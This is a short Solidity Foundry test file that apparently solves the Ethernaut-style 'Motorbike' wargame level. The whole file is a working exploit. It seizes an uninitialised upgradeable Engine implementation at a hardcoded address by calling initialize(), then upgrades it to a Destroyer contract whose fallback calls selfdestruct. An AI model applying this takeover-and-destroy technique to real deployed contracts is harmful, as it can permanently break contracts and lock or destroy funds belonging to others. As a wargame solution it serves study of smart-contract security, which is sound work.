// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Motorbike, Engine} from "../src/Motorbike.sol";

contract MotorbikeTest is Test {
    Motorbike public motorbike = Motorbike(payable(0x955e7f3d3a390F4900d1812f55D070538740F13d));
    Engine public engine = Engine(payable(0x73B9763719eFF95c782334142b1d1734Db1AE261));

    function testAttack() public {
        engine.initialize();

        address destroyer = 0x5DeA8e7db486d9967a96Cfd80836860521196176;
        engine.upgradeToAndCall(destroyer, abi.encodeWithSignature("abc()"));
    }
}

contract Destroyer {
    fallback() external payable {
        selfdestruct(payable(address(0)));
    }
}